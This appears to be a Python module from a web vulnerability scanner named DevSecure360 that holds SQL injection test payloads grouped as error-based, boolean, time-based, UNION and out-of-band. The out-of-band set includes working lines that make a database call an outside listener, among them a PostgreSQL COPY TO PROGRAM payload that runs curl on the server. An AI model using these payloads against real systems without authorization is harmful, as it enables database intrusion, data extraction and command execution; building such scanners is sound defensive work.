"""
DevSecure360 — DAST SQLi Payloads
====================================
SQL Injection payload set for error-based, boolean, time-based, and OOB detection.
Sources: OWASP Testing Guide v4.2 (WSTG-INPV-05), PayloadsAllTheThings SQLi corpus.
"""

from dataclasses import dataclass


@dataclass
class Payload:
    value: str
    technique: str   # "error" | "boolean_true" | "boolean_false" | "time" | "oob" | "union"
    canary_id: str = ""


def get_error_payloads() -> list:
    """Payloads that trigger DB-specific error messages."""
    return [
        Payload("'", "error"),
        Payload('"', "error"),
        Payload("\\", "error"),
        Payload("'--", "error"),
        Payload("' OR '1", "error"),
        Payload("') OR ('1'='1", "error"),
        Payload("1'", "error"),
        Payload("1\"", "error"),
    ]


def get_boolean_pairs() -> list:
    """
    Returns pairs of (true_payload, false_payload) for differential analysis.
    The true condition returns extra content vs the false condition.
    """
    return [
        ("' OR '1'='1", "' OR '1'='2"),
        ("' OR 1=1--", "' OR 1=2--"),
        ("1 OR 1=1", "1 OR 1=2"),
        ("' OR 'x'='x", "' OR 'x'='y"),
    ]


def get_time_payloads() -> list:
    """Payloads that cause DB sleep — confirmed by response time delta > 4.5s."""
    return [
        Payload("' AND SLEEP(5)--", "time"),
        Payload("'; WAITFOR DELAY '0:0:5'--", "time"),      # MSSQL
        Payload("' AND pg_sleep(5)--", "time"),              # PostgreSQL
        Payload("' OR SLEEP(5)--", "time"),
        Payload("1; SELECT pg_sleep(5)--", "time"),
        Payload("') OR SLEEP(5)--", "time"),
        Payload("') AND SLEEP(5) AND ('1'='1", "time"),
    ]


def get_union_payloads() -> list:
    """UNION-based payloads to extract data."""
    return [
        Payload("' UNION SELECT NULL--", "union"),
        Payload("' UNION SELECT NULL, NULL--", "union"),
        Payload("' UNION SELECT NULL, NULL, NULL--", "union"),
        Payload("' UNION SELECT 1, 'devsecure_union_test', 3--", "union"),
    ]


def get_oob_payloads(oob_url: str, canary_id: str) -> list:
    """Out-of-band payloads that trigger network callbacks to OOB listener."""
    return [
        # MySQL
        Payload(f"' UNION SELECT LOAD_FILE('{oob_url}/{canary_id}')--", "oob", canary_id),
        # MSSQL
        Payload(f"'; EXEC xp_dirtree '//{oob_url}/{canary_id}'--", "oob", canary_id),
        # PostgreSQL
        Payload(f"'; COPY (SELECT '') TO PROGRAM 'curl {oob_url}/{canary_id}'--", "oob", canary_id),
    ]
